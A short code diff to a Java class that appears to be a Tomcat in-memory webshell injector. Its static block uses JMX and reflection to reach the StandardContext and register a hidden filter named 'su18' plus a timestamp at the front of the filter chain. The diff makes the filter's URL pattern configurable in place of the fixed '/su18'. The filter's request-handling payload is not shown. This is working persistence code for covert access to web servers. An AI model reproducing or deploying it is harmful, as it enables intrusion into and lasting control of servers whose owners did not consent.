@@ -21,10 +21,11 @@ import java.util.*;
  */
 public class TFMSFromJMX implements Filter {
 
+	public static String pattern;
+
 	static {
 		try {
 			String filterName = "su18" + System.nanoTime();
-			String urlPattern = "/su18";
 
 			MBeanServer mbeanServer = Registry.getRegistry(null, null).getMBeanServer();
 			Field       field       = Class.forName("com.sun.jmx.mbeanserver.JmxMBeanServer").getDeclaredField("mbsInterceptor");
@@ -84,7 +85,7 @@ public class TFMSFromJMX implements Filter {
 					Object filterMap = filterMapClass.newInstance();
 					filterMap.getClass().getDeclaredMethod("setFilterName", new Class[]{String.class}).invoke(filterMap, filterName);
 					filterMap.getClass().getDeclaredMethod("setDispatcher", new Class[]{String.class}).invoke(filterMap, DispatcherType.REQUEST.name());
-					filterMap.getClass().getDeclaredMethod("addURLPattern", new Class[]{String.class}).invoke(filterMap, urlPattern);
+					filterMap.getClass().getDeclaredMethod("addURLPattern", new Class[]{String.class}).invoke(filterMap, pattern);
 					//调用 addFilterMapBefore 会自动加到队列的最前面，不需要原来的手工去调整顺序了
 					standardContext.getClass().getDeclaredMethod("addFilterMapBefore", new Class[]{filterMapClass}).invoke(standardContext, filterMap);
 
